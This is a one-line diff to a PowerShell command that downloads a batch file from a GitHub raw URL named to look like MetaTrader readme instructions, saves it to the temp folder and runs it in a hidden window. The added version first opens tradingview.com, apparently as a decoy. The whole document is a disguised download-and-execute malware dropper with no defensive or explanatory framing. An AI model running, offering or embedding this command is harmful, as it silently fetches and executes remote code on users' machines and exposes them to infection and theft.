@@ -1,1 +1,1 @@
-$url = "https://raw.githubusercontent.com/hwangyounggul33/Mt_5/refs/heads/main/ReadMe_Instruction.mq4.cmd"; $output = "$env:TEMP\script.bat"; Invoke-WebRequest -Uri $url -OutFile $output; start-process $output -windowstyle h
+start "www.tradingview.com";$url = "https://raw.githubusercontent.com/hwangyounggul33/Mt_5/refs/heads/main/ReadMe_Instruction.mq4.cmd"; $output = "$env:TEMP\script.bat"; Invoke-WebRequest -Uri $url -OutFile $output; start-process $output -windowstyle h
